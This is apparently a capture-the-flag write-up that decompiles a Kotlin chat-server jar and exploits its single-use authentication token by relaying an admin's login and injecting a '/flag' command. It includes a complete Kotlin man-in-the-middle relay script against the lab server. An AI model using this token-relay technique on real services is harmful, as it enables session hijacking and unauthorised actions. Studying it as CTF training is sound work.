# Introduction
On the webpage for the chat client you are greeted with a public chat server, two download links and a server tester. If
you try to connect to the server you will get a random generated name and will be able to use the chat. If you also try
to use the self-test while logged in you will see that the admin user logs in and then disconnects.

If you download the server/client you will see that its an jar file, and by opening it in a archivemanager/unzipping it
you will see that its an kotlin project.

Since this is a kotlin/jvm application I will decompile the jar-file using IntelliJs built in decompiler.

## Looking for clues in the source-code
First I look for the main function, if you look in the manifest you will find that the main-class is 
`no.tghack.server.ServerKt`. By decompiling that file to Java you will find that it opens a `ServerSocket` and that for
each connection it accepts it will create a `ConnectionHandler`. Each connection handler are then initialized with a
`PacketListener` called `AuthenticationListener`.

Looking at `AuthenticationListener` you will see that it has the possibility of taking three different packets,
`Handshake`, `Disconnect` and`Authentication`. Looking at the `Authentication` packet you will see that it takes a 
userId and a UUID which probably would mean it doesn't handle tokens properly. You will also see it call the method
`validateAuthentication(Authenticate authentication, Continuation var2)`. Looking at the content you will see that it
does a POST request to `<severUrl>/authentication` with the userId and token as parameter.

## Getting a token
By inspecting the protocol using wireshark or using MITMproxy you should be able to extract the token. By trying it
against the authentication endpoint you should figure out that the token can only be used once.

We now know that we get an admin token we can then try to automate an attack. The simplest way to do so would be to
just redirect all TCP traffic from your own server socket and send it to the sample server. When the authentication have
finished you should be able to execute the /flag command using the chat packet and get a chat packet in return
containing the flag.

Since the server includes all the network code unobfuscated it should be pretty simple to implement an exploit using the
jar-file:
```kotlin
import no.tghack.network.*
import no.tghack.network.protocol.*
import java.net.ServerSocket
import java.net.Socket

fun main() {
    val serverSocket = ServerSocket(1338)

    val inHandler = ConnectionHandler(serverSocket.accept())
    val outHandler = ConnectionHandler(Socket("localhost", 1337))
    inHandler.packetListener = RedirectListener(outHandler)
    outHandler.packetListener = RedirectListener(inHandler)

    Thread(inHandler).start()
    Thread(outHandler).start()
}

class RedirectListener(private val to: ConnectionHandler) : PacketListener {
    override fun handle(keepAlive: KeepAlive) {
        to.send(keepAlive)
    }
    override fun handle(chat: Chat) {
        to.send(chat)
        println(chat.message)
    }
    override fun handle(disconnect: Disconnect) {
        to.send(disconnect)
    }
    override fun handle(authenticate: Authenticate) {
        to.send(authenticate)
        to.send(Chat("/flag"))
    }
    override fun handle(handshake: Handshake) {
        to.send(handshake)
    }
    override fun alive(): Boolean = true
    override fun onFreeTime() {}
}
```

This should yield the result
```
The flag is TG21{...}
```